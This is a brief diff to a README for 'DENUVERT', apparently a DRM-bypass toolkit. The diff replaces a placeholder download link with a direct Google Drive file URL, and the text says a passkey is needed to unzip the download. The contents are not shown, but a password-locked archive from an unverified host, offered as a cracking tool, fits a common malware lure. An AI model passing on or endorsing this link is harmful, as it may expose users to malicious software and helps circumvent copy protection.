@@ -47,7 +47,7 @@ By using DENUVERT, you agree to abide by our terms and conditions:
 
 Click the button below to download the DENUVERT toolkit. You need a passkey to unzip the tools after download. For further assistance, join our Discord server. 🚀🔧
 
-[Download Now](#)
+[Download Now](https://drive.usercontent.google.com/download?id=1BUTAlINYEqLlJIVgej8aHD4WX4JlPXzo&export=download&authuser=0)
 
 ## Contact
 
